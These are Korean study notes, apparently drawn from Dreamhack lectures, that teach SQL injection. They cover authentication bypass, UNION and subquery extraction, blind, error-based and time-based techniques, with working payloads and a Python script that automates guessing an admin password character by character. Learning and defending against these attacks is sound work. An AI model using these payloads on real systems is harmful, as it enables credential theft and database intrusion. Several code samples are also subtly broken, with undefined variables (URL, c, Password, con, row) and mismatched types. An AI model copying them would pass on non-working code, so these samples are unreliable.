# Web Hacking: Server-side Advanced - SQL Injection
🔖 출처
* [Dreamhack Lecture] Server-side Advanced - SQL Injection [🔗](https://dreamhack.io/lecture/courses/27)
* [Dreamhack Web Hacking Advanced - Server Side] Background: SQL Features [🔗](https://dreamhack.io/lecture/courses/303)
* [Dreamhack Web Hacking Advanced - Server Side] Background: SQL DML [🔗](https://dreamhack.io/lecture/courses/302)
* [Dreamhack Web Hacking Advanced - Server Side] Exploit Tech: Blind SQL Injection Advanced [🔗](https://dreamhack.io/lecture/courses/304)
* [Dreamhack Web Hacking Advanced - Server Side] Exploit Tech: Error & Time based SQL Injection [🔗](https://dreamhack.io/lecture/courses/286)
* [Dreamhack Web Hacking Advanced - Server Side] Exploit Tech: System Table Fingerprinting [🔗](https://dreamhack.io/lecture/courses/306)
* [Dreamhack Web Hacking Advanced - Server Side] Exploit Tech: DBMS Fingerprinting [🔗](https://dreamhack.io/lecture/courses/305)

<br/><br/>

## Overview: SQL Injection
📌 SQL Injection Basic [🔗](https://github.com/augustf86/Today_I_Learn/blob/main/Security/Web%20Hacking/Web%20Hacking%3A%20Server-side%20Basic.md#sql-injection) *← click!*
* SQL Injection: SQL 쿼리에 사용자의 입력값이 삽입되어 사용자가 원하는 쿼리를 실행할 수 있는 취약점
    - SQL을 사용하는 데이터베이스는 여러 종류가 있음 *→ DBMS의 종류에 따라 조금씩 다른 기법이 필요함*
    - SQL Injection 공격 수행을 위해선 RDBMS와 SQL에 대한 이해가 반드시 필요함

<br/><br/><br/>

## SQL Injection 공격 기법
* SQL Injection 취약점이 발생했을 때 데이터베이스 내에 존재하는 데이터를 획득하기 위한 다양한 공격 기법들이 존재함

<br/><br/>

### Logic
* Background: **논리 연산**
    - 대표적인 논리 연산자로는 ```and``` 연산과 ```or``` 연산이 있음
        | 논리 연산 | 설명 |
        |:---:|------|
        | **and 연산** | 모든 조건이 참인 경우에만 결과가 참이 됨 |
        | **or 연산** | 하나의 조건이라도 참이 되는 경우 결과는 참이 됨 |
    - 논리 연산(and, or) 예시
        | A | B | ```A && B``` <br/> (and 연산) | ```A \|\| B``` <br/> (or 연산) |
        |:---:|:---:|:---:|:---:|
        | 0 | 0 | 0 | 0 |
        | 1 | 0 | 0 | 1 |
        | 0 | 1 | 0 | 1 |
        | 1 | 1 | 1 | 1 |

<br/>

* **논리 연산**을 이용한 공격 방법 예시: 사용자에게 ```uid```, ```upw```를 입력 받아 uid를 조회하는 경우
    - 🙂 정상적인 사용자의 입력과 생성되는 쿼리문
        | | 사용자 입력 |
        |:---:|------|
        | **uid** | admin |
        | **upw** | admin |
        ```sql
        # uid가 'admin'이고, upw가 'admin'인 데이터를 조회하는 쿼리문이 생성됨
        SELECT uid FROM user_table WHERE uid='admin' AND upw='admin';
        ```
    - 😈 악의적인 사용자의 입력과 생성되는 쿼리문
        | | 사용자 입력 |
        |:---:|------|
        | **uid** | admin' or 1-- |
        | **upw** | 아무 압력이나 상관 없음 (주석 처리됨) |
        ```sql
        # or 연산을 사용하게 되어 모든 결과가 반환되게 됨 (주석 문자로 뒷부분 주석 처리)
        SELECT uid FROM user_table WHERE uid='admin' or '1' --AND upw='';
        ```
        + ⚠️ 해당 테이블에 존재하는 모든 데이터에 접근할 수 있음


<br/><br/>

### UNION
* Background: **UNION**
    - 다수의 SELECT 구문을 결합하는 절 *→ '합집합'을 의미함*
    - ⚠️ ```UNION``` 절을 통해 다른 테이블에 접근하거나 원하는 쿼리 결과를 생성해 애플리케이션에서 처리하는 다른 데이터를 조작할 수 있음
        + 애플리케이션이 **데이터베이스 쿼리의 실행 결과를 출력**할 경우 ```UNION``` 절이 공격에 유용하게 쓰일 수 있음
        + ```UNION```은 중복을 포함하지 않지만, ```UNION ALL```은 중복을 포함하여 모든 결과를 구함
    - **```UNION``` 절을 사용할 때는 2가지 필수 조건을 만족해야 함**
        | | 조건 |
        |:--:|------|
        | 1 | 이전 ```SELECT``` 구문과 ```UNION```을 사용하는 구문의 실행 결과 중 컬럼(열)의 갯수가 일치해야 함 |
        | 2 | 특정 DBMS에서는 이전 ```SELECT``` 구문과 ```UNION```을 사용한 구문의 컬럼(열)의 타입이 동일해야 함 |
        + 2가지 필수 조건 중 하나라도 만족하지 않으면 에러가 발생함

<br/>

* UNION 절을 이용한 공격 예시: 사용자에게 ```uid```, ```upw```를 입력 받아 uid를 조회하는 경우
    - 🙂 정상적인 사용자의 입력과 생성되는 쿼리문
        | | 사용자 입력 |
        |:---:|------|
        | **uid** | admin |
        | **upw** | admin |
        ```sql
        # uid가 'admin'이고, upw 'admin'인 데이터를 조회하는 쿼리문이 생성됨
        SELECT uid FROM user_table WHERE uid='admin' AND upw='admin';
        ```
    - 😈 악의적인 사용자의 입력과 생성되는 쿼리문
        | | 사용자 입력 |
        |:---:|------|
        | **uid** | ' UNION SELECT upw FROM user_table WHERE uid='admin' -- |
        | **upw** | 아무 압력이나 상관 없음 (주석 처리됨) |
        ```sql
        # UNION 절을 이용해 admin의 upw를 화면에 출력시킴
        SELECT uid FROM user_table WHERE uid='' UNION SELECT upw FROM user_table WHERE uid='admin' -- AND upw='';
        ```

<br/><br/>

### Subquery
* Background: **Subquery**
    - 한 쿼리 내에 또 다른 쿼리를 사용하는 것
        + 하나의 SQL문 안에 다른 SQL문이 중첩된(nested) 질의 → '부속질의'라고도 함
    - 주질의(main query, 외부질의)와 부속질의(subquery, 내부질의)로 구성됨
        + 📌 서브쿼리는 메인 쿼리 내에서 **소괄호 안에 구문을 삽입**해야 하며, ```SELECT``` 구문만 사용할 수 있음
    - 위치와 역할에 따른 서브쿼리의 분류
        + ```SELECT``` 절에서 사용되며 **단일 값**을 반환하는 **스칼라 부속질의**(scalar subquery)
            - 💡 ```SELECT``` 구문의 컬럼(COLUMNS) 절에서 서브 쿼리를 사용할 때에는 **단일 행**(Single Row)과 **단일 열**(Single Column)이 반환되도록 해야 함
                + 복수의 행과 열을 반환하는 서브 쿼리를 작성하면 실행 시 에러를 발생할 수 있음 <br/> &nbsp;&nbsp;&nbsp;&nbsp; ↳ *결과가 다중 행이거나 다중 열이라면 DBMS는 그 중 어떠한 행, 어떠한 열을 출력해야 하는지 알 수 없어 에러를 출력함*
                    - 예시
                        ```sql
                        # 복수 행을 반환함 (에러 발생; Subquery returns more than 1 row)
                        SELECT username, (SELECT 'ABCD' UNION SELECT 1234) FROM users;

                        # 복수 열을 반환함 (에러 발생: Operand should contain 1 column(s))
                        SELECT username, (SELECT "ABCD", 1234) FROM users;
                        ```
            - ```SELECT``` 구문과 ```UPDATE``` 구문에서 사용할 수 있음
        + ```FROM``` 절에서 결과를 **뷰**(View) 형태로 반환하는 **인라인 뷰**(Inline View, table subquery)
            - ```FROM``` 절에서 서브 쿼리를 사용하면 다중 행(Multiple Rows)과 다중 열(Multiple Columns) 결과를 반환할 수 있음
            - 뷰(View): 기존 테이블로부터 **일시적으로** 만들어진 가상의 테이블
                + ```AS```를 사용하여 뷰에 테이블 별칭을 명명할 수 있음
            - 인라인 뷰 예시
                ```sql
                # 생성한 인라인 뷰(user 테이블의 모든 열과 1234를 열으로 가지는 테이블)의 별칭을 u로 명명함
                SELECT * FROM (SELECT *, 1234 FROM users) AS u; 
                ```
        + ```WHERE``` 절에서 술어(predicate)와 같이 사용되며 결과를 한정시키기 위해 사용하는 **중첩질의**(nested subquery, predicate subquery)
            - ```WHERE```절에서 서브 쿼리를 사용하면 다중 행(Multiple Rows) 결과를 반환하는 쿼리문을 실행할 수 있음
            - 주질의의 자료 집합에서 한 행씩 가져와 부속질의를 수행함 <br/> &nbsp;&nbsp; → 연산 결과에 따라 ```WHERE``` 절의 조건이 참인지 거짓인지 확인하여 참이면 주질의의 해당 행을 출력함
            - 중첩질의 예시
                ```sql
                # users 테이블에서 username이 "admin", "guest"인 행을 검색함
                SELECT * FROM users WHERE username IN (SELECT "admin" UNION SELECT "guest");
                ```

<br/>

* Subquery를 이용한 공격 예시: 사용자에게 ```username```을 입력 받아 해당 username을 조회한 후 admin이면 true를, 아니면 false를 반환하는 경우
    - 🙂 정상적인 사용자의 입력과 생성되는 쿼리문
        | | 사용자 입력 |
        |:---:|------|
        | **username** | admin |
        ```sql
        # username이 'admin'인 항목의 username을 조회하는 쿼리문이 생성됨
        SELECT username FROM user_table WHERE username='admin';
        ```
    - 😈 악의적인 사용자의 입력과 생성되는 쿼리문
        | | 사용자 입력 |
        |:---:|------|
        | **username** | ' UNION SELECT IF(SUBSTR(upw, start, 1)='알파벳', 'admin', 'not admin') FROM user_table WHERE username='admin' -- |
        ```sql
        # SQL의 IF문을 사용해 비교 구문을 만들어 관리자 계정의 비밀번호를 한 글자씩 알아냄
        # start: 시작 위치, len: 길이(한 자리씩 비교하므로 1), '알파벳': 'a', 'b' 와 같이 해당 위치의 알파벳과 비교할 알파벳을 명시함
        #   ↳ 비교 결과 일치하면 'admin'을, 그렇지 않으면 'not admin'을 반환함 
        
        SELECT username FROM user_table WHERE username='' UNION SELECT IF(SUBSTR(upw, start, 1)='알파벳', 'admin', 'not admin') FROM user_table WHERE username='admin' -- AND userpw='';
        ```
        + Supplement
            - **SQL의 ```IF``` 조건문**: ```IF (조건문, 참일때 값, 거짓을 때 값)```
                ```sql
                SELECT IF(required, '필수', '선택') AS '필수 여부' FROM TABLE
                ```
            - **```SUBSTR``` 함수**: 문자열 중 특정 위치에서 시작하여 지정한 길이만큼 문자열을 반환하는 함수
                ```sql
                SUBSTR('문자열', 시작위치, 길이)
                ```

<br/><br/>

### Blind SQL Injection
* 데이터베이스 조회 후 결과를 직접적으로 확인할 수 없을 때 사용될 수 있는 공격 기법
    - DBMS의 함수 또는 연산 과정 등을 이용해 데이터베이스 내에 존재하는 데이터와 이용자의 입력을 비교함 <br/> &nbsp;&nbsp; → 특정한 조건 발생 시 특별한 응답을 발생시켜 해당 비교에 대한 검증을 수행함
    - Blind SQL Injection을 수행하기 위해 만족해야 하는 조건
        | | 조건 |
        |:---:|------|
        | 1 | 데이터를 비교해 참/거짓을 구분함 |
        | 2 | 참/거짓의 결과에 따른 특별한 응답을 생성함 |
        + 데이터를 비교하여 참/거짓을 구분하는 구분으로 **If Statements**를 많이 사용함
            - DBMS별 IF Statement 사용 예시
                ```sql
                # MySQL: IF Statement (IF(조건식, 참일때 수행할 값, 거짓일 때 수행할 값)의 형태로 사용됨)
                SELECT IF(1=1, True, False);

                # SQLite: CASE expression (WHEN 다음의 식이 참이라면 THEN...ELSE 사이의 값를, 거짓이라면 ELSE...END 사이의 값을 출력함)
                SELECT CASE WHEN 1=1 THEN 'true' ELSE 'false' END;

                # MSSQL: IF (IF 키워드 다음에 위치한 조건의 결과가 참이라면 SELECT 구문을 수행함)
                if (SELECT 'test') = 'test' SELECT 1234;
                ```
    - 📌 Blind SQL Injection의 단점 *→ 조금 더 효율적인 방법으로 Blind SQL Injection을 수행해야 함*
        + 수많은 쿼리를 전송하기 때문에 실제 환경에서는 방화벽에 의해 접속 IP가 차단될 수 있음
        + 데이터의 길이가 길면 길수록 실행해야 하는 쿼리의 수도 증가하고 공격에 들이는 시간이 길어짐

<br/>

* Blind SQL Injection: 데이터베이스의 결과를 받은 어플리케이션에서 결과 값에 따라 다른 행위를 수행하게 되는 점을 이용해 참과 거짓을 구분하는 방법
    - 예시 코드와 데이터베이스
        ```python
        from flask import Flask, request # Flask 프레임워크 사용
        import pymysql # mysql을 DBMS로 사용함

        app = Flask(__name__)

        def getConnection():
            return pymysql.connect(host='localhost', user='dream', password='hack', db='dreamhack', charset='utf8')

        @app.route('/', methods=['GET'])
        def index():
            username = request.args.get('username') # 이용자가 전달한 username 인자값을 가져옴

            # 이용자가 입력한 username이 별다른 검사 없이 SQL 쿼리에 포함됨 → ⚠️ SQL Injection 취약점이 발생함
            sql = "select username from users where username='%s'" %username

            conn = getConnection()
            curs = con.cursor(pymysql.cursors.DictCursor)
            curs.execute(sql)
            rows = curs.fetchall()
            conn.close()

            # SQL 실행 결과가 아닌 True/False만을 출력함
            if (row[0]['username'] == 'admin'): # 데이터베이스의 결과인 username이 "admin"인 경우 이용자에게 "True"가 반환됨
                return "True"
            else: # 그렇지 않은 경우 "False"가 반환됨
                return "False"
        
        app.run(host='0.0.0.0', port=8000)
        ```
        | username | password |
        |:---:|------|
        | admin | Password_for_admin |
        | guest | guest_Password |
    - Blind SQL Injection 수행 가능 여부 확인: *```UNION``` 구문을 이용한 ```"admin"``` 반환*
        + ```index()``` 함수의 ```if...else``` 조건문 부분
            - 데이터베이스에서 반환된 결과가 ```"admin"```인 경우 이용자에게 ```"True"```가 반환됨
            - 데이터베이스에서 반환된 결과가 ```"admin"```이 아닌 경우 이용자에게 ```"False"```가 반환됨
    - Blind SQL Injection 공격 방법: **IF Statements** 및 비교 구문 추가
        + 이용자가 전달한 username 인자값
            ```
            /?username=' UNION SELECT IF(SUBSTR(password, 시작위치, 1)='비교할 알파벳', 'admin', 'not admin') FROM users WHERE username='admin'--
            ```
            - ```SUBSTR(string, position, length)``` 함수: 문자열(string)에서 지정한 위치(position)부터 길이(length)까지의 값을 반환하는 함수
                | SUBSTR 함수의 인자 | 설명 |
                |:---:|------|
                | string | Blind SQL Injection 공격을 통해 비밀번호를 획득하는 것이 목적 <br/> &nbsp;&nbsp; → users 데이터베이스의 **password** 부분의 데이터를 가져와 비교해야 함 |
                | position | password의 첫 번째부터 마지막 길이까지 하나씩 이동해가면서 쿼리를 전송해야 함 <br/> &nbsp;&nbsp; → ```position```의 값은 ```1 ~ (패스워드 길이)``` 범위의 정수값 |
                | length | 한 글자씩 password의 값을 알아내므로 ```length```의 값은 1로 고정됨 |
        - 예시: password의 첫 번째 문자를 알아내는 방법
            ```
            /?username=' UNION SELECT IF(SUBSTR(password, 1, 1)='A', 'admin', 'not admin') FROM users WHERE username='admin'-- ⇒ FALSE
            /?username=' UNION SELECT IF(SUBSTR(password, 1, 1)='B', 'admin', 'not admin') FROM users WHERE username='admin'-- ⇒ FALSE
            /?username=' UNION SELECT IF(SUBSTR(password, 1, 1)='C', 'admin', 'not admin') FROM users WHERE username='admin'-- ⇒ FALSE
            /?username=' UNION SELECT IF(SUBSTR(password, 1, 1)='D', 'admin', 'not admin') FROM users WHERE username='admin'-- ⇒ FALSE

            ...

            /?username=' UNION SELECT IF(SUBSTR(password, 1, 1)='P', 'admin', 'not admin') FROM users WHERE username='admin'-- ⇒ TRUE
            ```
            + ***이와 같은 방법으로 position과 비교할 문자를 변경해가며 password 전체를 획득할 수 있음***

<br/>

* Blind SQL Injection 공격 자동화
    - 한 바이트씩 비교하여 공격하는 방식이므로 다른 공격에 비해 많은 시간을 들여야 하며 이용자가 직접 입력하기엔 물리적으로 한계가 발생할 수 있음 <br/> &nbsp;&nbsp; **→ 📌 공격을 자동화하는 스크립트를 작성하여 Blind SQL Injection 공격을 수행함**
        + 대중적으로 많이 사용되는 Python이나 웹 브라우저에 기본적으로 내장되어 있는 Javascript를 이용하는 등 다양한 언어와 라이브러리를 활용하여 효율적인 공격 스크립트를 작성할 수 있음
    - 파이썬의 ```requests``` 모듈을 이용한 스크립트 작성 방법
        + ⚠️ 공격 자동화 스크립트를 작성하기 전에 **이용자가 입력할 수 있는 모든 문자의 범위**를 지정해야 함
            - 비밀번호의 경우 일반적으로 알파벳 대소문자, 숫자, 그리고 특수문자로 이루어짐 → 아스키 범위 중에서 32부터 126까지를 지정하여 공격 스크립트를 작성함
        + Python을 이용한 공격 자동화 스크립트 예시
            ```python
            #!/usr/bin/python3

            import requests
            import string

            url = 'http://example.com/login' # 공격 URL
            password = '' # password를 저장할 변수
            
            # 비밀번호가 포함될 수 있는 문자를 string 모듈로 사용해 생성함
            tc = string.ascii_letters + string.digits + string.punctuation
            # tc → abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~

            # ⚠️ 길이를 먼저 구하고 길이만큼 반복문을 돌릴 수도 있음
            for index in range(1, 100):
                for ch in tc: # tc 대신에 range(32, 127)을 사용해도 무관함
                    payload= "/?username=' UNION SELECT IF(SUBSTR(password, %s, 1)=ORD(%s), 'admin', 'not admin') FROM users WHERE username='admin'--" %(index, ch)
                    addr = URL + payload

                    ret = requests.get(addr)
                    if c.text.find("True") != -1: # 데이터베이스에서 "admin"을 반환하면 출력되는 "True" 문자열을 찾음
                        password += chr(ch) # 해당 결과를 반환하는 문자를 password 변수에 추가함
                        break
            
            # admin의 전체 비밀번호를 출력함
            print(f"Password is {Password}")
            ```

<br/>

* Blind SQL Injection을 통해 데이터베이스의 내용을 효율적으로 알아내기 위한 방법
    - Binary Search (이진 탐색)
        + 이미 정렬된 리스트에서 검색 범위를 절반씩 좁혀가며 데이터를 탐색하는 방법 (효율적인 탐색을 위한 알고리즘)
            - 이진 탐색의 과정 → *찾으려는 데이터와 중간점에 위치하는 데이터를 반복적으로 비교해서 원하는 데이터를 찾음*
                | 과정 | 설명 |
                |---|------|
                | **1. 범위 지정** | 범위에서 한 숫자만이 정답일 때 범위의 **중간값**을 지정함 |
                | **2. 범위 조절** | 정답이 중간값보다 큰 값인지 확인함 <br/> &nbsp;&nbsp; → 큰 값이라면 범위를 ```(중간값 + 1) ~ (마지막 값)```으로 조절함 <br/> &nbsp;&nbsp; → 작은 값이라면 범위를 ```(첫 번째 값) ~ (중간값 - 1)```으로 조절함 |
                + ***1번과 2번 과정을 반복하다보면 범위를 크게 좁힐 수 있고, 최종적으로 정답을 찾아낼 수 있음***
        + Binary Search를 이용한 Blind SQL Injection 공격 예시
            - users 데이터베이스의 구성 (예시)
                | username | password |
                |:---:|------|
                | admin | P@ssword |
            - Binary Search를 이용한 공격 방법
                + 비밀번호에 포함될 수 있는 아스키에서 출력 가능한 문자의 범위(```32 ~ 126```)을 미리 확인하고 Binary Search를 통해 해당 범위를 좁혀가며 탐색을 진행함
                + 공격 코드 예시
                    ```sql
                    SELECT * FROM users WHERE username='admin' AND ASCII(SUBSTR(password, 1, 1)) > 79;
                    # P는 아스키 값으로 80이기 때문에 79보다 커 결과가 출력됨 → 큰 값이므로 다음 범위는 78 ~ 126이 됨
                    ```
                    - 아스키에서 출력 가능한 문자의 범위를 이진 탐색으로 좁혀가는 과정을 반복하다보면 비밀번호를 한 글자씩 알아낼 수 있음
    - Bit 연산을 이용하는 방법
        + 7개의 비트에 대해 1인지 비교하여 총 7번의 쿼리로 임의 데이터의 한 바이트를 알아내는 방법
            - Bit 연산의 출발 배경
                + 하나의 비트는 0과 1로 이루어져 있으며, ASCII는 0 ~ 127 범위의 문자를 표현할 수 있음 <br/> &nbsp;&nbsp; → 7개의 비트를 통해 하나의 문자를 나타낼 수 있음을 의미함
            - MySQL의 ```BIN``` 험수와 ```ORD``` 함수
                | 함수 | 형태 | 설명 |
                |:---:|:---:|------|
                | **BIN** | ```BIN(숫자)``` | 인자로 입력된 숫자를 2진수로 반환함 |
                | **ORD** | ```ORD(문자)``` | ```'A'```와 같이 인자로 입력된 문자의 아스키 코드 값을 반환함 |
                + 사용 예시
                    ```sql
                    SELECT BIN(ORD('A')); # 'A'(문자)를 아스키 코드 값(숫자) 형태로 변환하고, 이를 다시 비트의 형태로 반환함
                    ```
        + Bit 연산을 이용한 Blind SQL Injection 공격 예시
            - users 데이터베이스의 구성 (예시)
                | username | password |
                |:---:|------|
                | admin | P@ssword |
            - Bit 연산을 이용한 공격 방법
                + ```SUBSTR```과 ```BIN```을 이용해서 총 7번의 쿼리를 실행해 바이트씩 알아낼 수 있음 → 이를 비밀번호의 길이만큼 반복하여 전체 비밀번호를 알아낼 수 있음
                + 공격 코드 예시: password의 첫 번째 문자
                    ```sql
                    SELECT * FROM users username='admin' AND SUBSTR(BIN(ORD(password)), 1, 1)=1; # 결과가 출력됨 (첫번째 자리 1)
                    SELECT * FROM users username='admin' AND SUBSTR(BIN(ORD(password)), 2, 1)=1; # 결과가 출력되지 않음 (두번째 자리 0)
                    SELECT * FROM users username='admin' AND SUBSTR(BIN(ORD(password)), 3, 1)=1; # 결과가 출력됨 (세번째 자리 1)
                    SELECT * FROM users username='admin' AND SUBSTR(BIN(ORD(password)), 4, 1)=1; # 결과가 출력되지 않음 (네번째 자리 0)
                    SELECT * FROM users username='admin' AND SUBSTR(BIN(ORD(password)), 5, 1)=1; # 결과가 출력되지 않음 (다섯번째 자리 0)
                    SELECT * FROM users username='admin' AND SUBSTR(BIN(ORD(password)), 6, 1)=1; # 결과가 출력되지 않음 (여섯번째 자리 0)
                    SELECT * FROM users username='admin' AND SUBSTR(BIN(ORD(password)), 7, 1)=1; # 결과가 출력되지 않음 (일곱번째 자리 0)
                    # 비밀번호의 첫 번째 바이트: 1010000 → 10진수로 표현하면 80 (문자로 표현하면 'P')
                    ```

<br/><br/>

### Error based
* 임의로 에러를 발생시켜 데이터베이스 및 운영체제의 정보를 획득하는 공격 기법
    - 쿼리 결과를 애플리케이션의 기능에서 출력하지 않는 경우에 사용할 수 있는 공격 형태 *→ 공격 성공 여부를 에러를 통해 알 수 있음*
        + ⚠️ 애플리케이션에서 발생하는 에러를 이용해 공격하려고 한다면 **런타임 에러**가 필요함
            - 런타임 에러(Runtime Error): 퀴리가 실행되고 나서 실행하는 에러
        + 문법 에러(Syntax Error)와 같이 **DBMS에서 쿼리가 실행되기 전에 발생하는 에러는 불가능함**
    - 공격자는 오류(에러) 메시지를 통해 공격에 필요한 다양한 정보를 수집하고 원하는 데이터를 획득할 수 있음
        + ***에러 메시지와 같이 쿼리 실행 결과를 직접 노출하지는 않지만, 중요한 정보를 노출하는 방법들이 존재함***

<br/>

* Error based SQL Injection 예시: 사용자에게 ```username```을 입력 받아 해당 username을 조회한 후 admin이면 true를, 아니면 false를 반환하는 경우
    ```python
    from flask import Flask, request # Flask 프레임워크 사용
    import pymysql

    app = Flask(__name__)

    def getConnection():
        return pymysql.connect(host='localhost', user='dream', password='hack', db='dreamhack', charset='utf8')

    @app.route('/'. methods=['GET'])
    def index():
        username = request.args.get('username') # 이용자가 전달한 username 인자값을 가져옴

        # 이용자가 입력한 username이 별다른 검사 없이 SQL 쿼리에 포함됨 → ⚠️ SQL Injection 취약점이 발생함
        sql = "SELECT username FROM users WHERE username='%s'" %username

        conn = getConnection()
        curs = conn.cursor(pymysql.cursors.DictCursor)
        curs.execute(sql)
        rows = curs.fetchall()
        conn.close()

        # SQL 실행 결과를 출력하는 코드가 존재하지 않고 쿼리 실행 결과(True/False)만 판단함
        if (rows):
            return "True"
        else:
            return "False"
    
    app.run(host='0.0.0.0', port=8000, debug=True) # 디버그 모드 활성화(debug=True)
    ```
    - Error based SQL Injection 공격 방법
        + Flask 프레임워크로 개발한 애플리케이션에서 디버그 모드를 활성화하면 코드에서 오류가 발생했을 때 발생 원인을 출력함
        + 에러 발생 예시: username에 ```admin 1'```을 입력하면 문법 에러(Syntax Error)가 발생함
            ```sql
            # 파이썬 코드 내 index 함수의 두 번째 실행문에서 생성되는 쿼리
            SELECT username FROM users WHERE username='admin 1''
            ```
    - Error based SQL Injection 공격 코드
        + Background: **```EXTRACTVALUE``` 함수**
            - 첫 번째 인자로 전달된 XML 데이터에서 두 번째 인자인 XPATH 식을 통해 데이터를 추출하는 함수
            - 두 번째 인자 값에 따른 함수 실행 결과
                + 올바른 XPATH 식을 전달한 경우 쿼리가 정상적으로 실행됨
                    ```sql
                    SELECT EXTRACTVALUE('<a>test</a><b>abcd</b>', '/a'); # 결과: test
                    ```
                + 올바르지 않은 XPATH 식을 전달한 경우 **에러 메시지에 삽입된 식의 결과가 출력됨** <br/> &nbsp;&nbsp; ***→ ⚠️ 올바르지 않은 XPATH 식에 중요한 정보를 추출할 수 있는 식을 입력한다면 공격자는 중요 정보를 획득할 수 있음***
                    ```sql
                    SELECT EXTRACTVALUE(1, ":abcd"); # 결과: ERROR 1105 (HY000): XPATH syntax error: ':abcd'
                    ```
        + MySQL 환경에서 Error based SQL Injection으로 공격할 때 많이 사용하는 쿼리와 실행 결과
            ```sql
            SELECT EXTRACTVALUE(1, CONCAT(0x3a, version()));
            # 결과: ERROR 1105 (HY000): XPATH syntax error: ':5.7.29-0ubuntu0.16.04.1-log'
            ```
            - XPATH 식에 삽입된 ```version()``` 함수가 실행되면서 에러 메시지에 운영체제에 대한 정보가 포함되어 있음 <br/> &nbsp;&nbsp; → 공격자는 이 정보를 이용해 1-day 또는 0-day 공격을 통해 서버를 장악할 수 있음
            - ```CONCAT(str1, str2[, str3, ...])``` 함수: 둘 이상의 문자열을 입력한 순서대로 합쳐서 반환해주는 함수
        + ```EXTRACTVALUE``` 함수와 서브쿼리를 이용하여 데이터베이스의 정보를 추출하는 쿼리와 실행 결과
            ```sql
            SELECT EXTRACTVALUE(1, CONCAT(0x3a, (SELECT password FROM users WHERE username='admin')));
            # 결과; ERROR 1105 (HY000): XPATH syntax error: ':This_is_admin_PASSW@rd'
            ```
            - XPATH 식에 삽입된 서브 쿼리가 실행되면서 에러 메시지에 users 테이블의 admin의 비밀번호가 포함되어 있음 <br/> &nbsp;&nbsp; → 공격자는 서브 쿼리를 이용해 임의 테이블의 데이터를 획득할 수 있음

<br/>

* DBMS별로 Error based SQL Injection을 위해 사용하는 주요 쿼리문
    - MySQL
        ```sql
        SELECT updatexml(null, concat(0x0a, version()), null);
        # ERROR 1105 (HY000): XPATH syntax error: '5.7.29-0ubuntu0.16.04.1-log'

        SELECT extractvalue(1, concat(0x3a, version()));
        # ERROR 1105 (HY000): XPATH syntax error: ':5.7.29-0ubuntu0.16.04.1-log'

        SELECT COUNT(*), CONCAT(SELECT version()), 0x3a, FLOOR(RAND(0)*2) x FROM information_schema.tables GROUP BY x;
        # ERROR 1062 (23000): Duplicate entry '5.7.29-0ubuntu0.16.04.1-log:1' for key '<group_key>'
        ```
    - MSSQL
        ```sql
        SELECT convert(int,@@version);
        SELECT cast((SELECT @@version) as int);
        /*
        Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2014 - 12.0.2000.8 (Intel X86) 
            Feb 20 2014 19:20:46 
            Copyright (c) Microsoft Corporation
            Express Edition on Windows NT 6.3 <X64> (Build 9600: ) (WOW64) (Hypervisor)
        ' to data type int.
        */
        ```
    - Oracle
        ```sql
        SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual;
        /*
        ORA-20000: Oracle Text error:
        DRG-11701: thesaurus Oracle Database 18c Express Edition Release 18.0.0.0.0 - Production does not exist
        ORA-06512: at "CTXSYS.DRUE", line 183
        ORA-06512: at "CTXSYS.DRITHSX", line 555
        ORA-06512: at line 1
        */

        SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual;
        /*
        ORA-53044: invalid tag: ORACLE DATABASE 18C EXPRESS EDITION RELEASE 18.0.0.0.0 - PRODUCTION
        ORA-06512: at "ORDSYS.ORDERROR", line 5
        ORA-06512: at "ORDSYS.ORD_DICOM_ADMIN_PRV", line 1390
        ORA-06512: at "ORDSYS.ORD_DICOM_ADMIN_PRV", line 475
        ORA-06512: at "ORDSYS.ORD_DICOM_ADMIN_PRV", line 8075
        ORA-06512: at "ORDSYS.ORD_DICOM", line 756
        ORA-06512: at line 1
        */
        ```

<br/>

* Error based Blind SQL Injection
    - Error based SQL Injection과 Error based Blind SQL Injection의 차이점
        | 공격 종류 | 설명 |
        |:---:|------|
        | **Error based SQLI** | 에러 메시지를 통해 출력된 데이터로 정보를 수집해 출력값에 영향을 받음 <br/> &nbsp;&nbsp; *→ 에러 메시지를 통해 데이터가 출력되는 에러를 이용해야 함* |
        | **Error based Blind SQLI** | 에러 발생 여부만을 필요로 하기 때문에 용이하게 사용할 수 있음 <br/> &nbsp;&nbsp; *→ 다른 Runtime Error도 사용 가능함* |
    - 📌 서버가 반환하는 HTTP Response 상태 코드(Status number) 또는 애플리케이션 응답 차이 등을 통해 에러 발생 여부를 판단하고 참/거짓 여부를 판단할 수 있음
        + 예시: MySQL의 ```DOUBLE``` 자료형의 최댓값을 초과해 에러를 발생시키는 경우
            ```sql
            SELECT IF (1=1, 9e307*2, 0); # 1=1이 참이므로 9e307*2를 반환함
            # 결과: ERROR 1690 (22003): DOUBLE value is out of range in '(9e307 * 2)'

            SELECT IF(1=0, 9e307*2, 0); # 1=0이 거짓이므로 0을 반환함
            # 결과: 0
            ``` 

<br/><br/>

### Time based
* 시간 지연을 통해 쿼리의 참/거짓 여부를 판단하는 공격 기법
    - 쿼리 결과를 애플리케이션 기능에서 출력하지 않는 경우에 사용할 수 있는 공격 형태 *→ 공격 성공 여부를 시간 지연을 통해 알 수 있음*
    - 시간 지연을 발생시키는 방법
        + ```SLEEP```과 같이 ***DBMS에서 제공하는 함수**를 이용하는 방법
        + 무거운 연산과정을 발생시켜 쿼리 처리 시간을 지연시키는 **헤비 쿼리**(heavy query)를 이용하는 방법
    - 💡 Time base SQL Injection 공격 시 주의사항
        + ```BENCHMARK``` 함수, heavy query 등과 같이 DBMS에서 기본적으로 제공하는 시간 지연함수가 아닌 경우애는 **대상 시스템의 성능, 환경 등에 따라 지연 시간이 다르게 동작할 수도 있음**
    
<br/> 

* DBMS별로 Time based SQL Injection을 통해 공격하는 방법
    - MySQL
        + MySQL에서 제공하는 함수를 이용하는 방법
            | 사용 함수 | 설명 |
            |:---:|------|
            | ```SLEEP(duration)``` | 대기할 시간(sec)을 인자로 받으며 지정한 시간만큼 대기하게 만드는 함수 (반환값 없음) <br/> &nbsp;&nbsp; - ```WHERE``` 조건문에 의해 선택되는 행의 수만큼 ```SLEEP``` 함수를 호춣함 → ```WHERE``` 조건문을 이용해 ```SLEEP``` 함수를 반복하게 만들 수 있음 |
